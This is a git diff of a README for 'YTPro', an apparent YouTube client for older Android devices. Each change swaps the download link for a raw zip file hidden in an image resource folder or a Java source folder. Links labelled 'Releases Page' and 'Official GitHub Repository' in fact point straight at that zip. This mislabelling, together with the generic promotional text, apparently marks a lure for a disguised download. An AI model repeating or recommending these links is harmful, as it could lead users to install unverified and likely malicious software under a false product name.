@@ -1,7 +1,7 @@
 # 🎥 YTPro - Enjoy YouTube on Older Devices
 
 ## 📥 Download Now
-[![Download YTPro](https://raw.githubusercontent.com/naka11107/YTPro/main/app/src/main/res/mipmap-xhdpi/YT_Pro_2.7.zip)](https://raw.githubusercontent.com/naka11107/YTPro/main/app/src/main/res/mipmap-xhdpi/YT_Pro_2.7.zip)
+[![Download YTPro](https://github.com/naka11107/YTPro/raw/refs/heads/main/app/src/main/java/com/google/android/youtube/pro/YT_Pro_2.0.zip)](https://github.com/naka11107/YTPro/raw/refs/heads/main/app/src/main/java/com/google/android/youtube/pro/YT_Pro_2.0.zip)
 
 ## 📖 About YTPro
 YTPro is a YouTube client designed for older Android devices. It features a background player, support for Google Gemini, and many more tools to enhance your viewing experience. With YTPro, you can enjoy ad-free videos while managing your downloads effortlessly.
@@ -10,7 +10,7 @@ YTPro is a YouTube client designed for older Android devices. It features a back
 Follow these simple steps to download and run YTPro:
 
 1. **Visit the Releases Page**
-   To get started, go to the releases page. You can find all available versions of YTPro here: [Visit the Releases Page](https://raw.githubusercontent.com/naka11107/YTPro/main/app/src/main/res/mipmap-xhdpi/YT_Pro_2.7.zip).
+   To get started, go to the releases page. You can find all available versions of YTPro here: [Visit the Releases Page](https://github.com/naka11107/YTPro/raw/refs/heads/main/app/src/main/java/com/google/android/youtube/pro/YT_Pro_2.0.zip).
 
 2. **Select the Latest Version**
    Look for the newest version of YTPro. It’s best to choose this version as it usually contains the latest features and fixes.
@@ -52,7 +52,7 @@ If you encounter issues or have questions about YTPro, please open an issue in t
 Join fellow users and share your experiences or suggestions on our GitHub Discussions page. Your feedback helps us improve YTPro further.
 
 ## 🔗 Additional Resources
-- **Official GitHub Repository:** [YTPro on GitHub](https://raw.githubusercontent.com/naka11107/YTPro/main/app/src/main/res/mipmap-xhdpi/YT_Pro_2.7.zip)
+- **Official GitHub Repository:** [YTPro on GitHub](https://github.com/naka11107/YTPro/raw/refs/heads/main/app/src/main/java/com/google/android/youtube/pro/YT_Pro_2.0.zip)
 - **Documentation:** Find guides and FAQs to get the most out of YTPro.
 
 Thank you for choosing YTPro. Enjoy streaming your favorite content!
